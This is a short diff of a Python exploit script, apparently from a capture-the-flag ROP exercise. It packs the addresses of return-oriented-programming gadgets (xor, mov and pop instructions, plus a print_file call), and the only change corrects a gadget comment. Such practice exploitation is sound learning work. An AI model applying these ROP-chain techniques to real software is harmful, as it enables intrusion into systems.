@@ -10,7 +10,7 @@ coff = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the
 print_file = struct.pack("I", 0x080483d0) # print_file(char*)
 
 xor_ebp_bl = struct.pack("I", 0x08048547) # xor [ebp], bl; ret
-mov_edi_esi = struct.pack("I", 0x0804854f) # mov [edi], ebp; ret
+mov_edi_esi = struct.pack("I", 0x0804854f) # mov [edi], esi; ret
 
 pop_esi_edi_ebp = struct.pack("I", 0x080485b9) # pop edi; pop ebp; ret
 pop_ebp = struct.pack("I", 0x080485bb) # pop ebp; ret
